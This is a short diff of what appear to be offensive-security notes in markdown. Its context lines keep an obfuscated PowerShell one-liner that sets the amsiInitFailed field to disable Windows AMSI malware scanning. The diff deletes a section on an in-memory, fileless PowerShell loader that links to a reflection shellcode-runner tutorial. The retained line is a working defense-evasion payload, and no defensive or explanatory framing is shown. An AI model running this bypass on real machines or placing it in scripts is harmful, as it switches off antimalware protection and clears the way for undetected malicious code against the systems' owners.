@@ -455,11 +455,3 @@ output =
 [Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
 ```
 
-# Powershell in-memory loader
-> ADVANTAGES of .net binaries -> can be loaded and executed completely in-memory (fileless)
-
-Powershell loader
-
-<https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c>
-
-dot-net execute
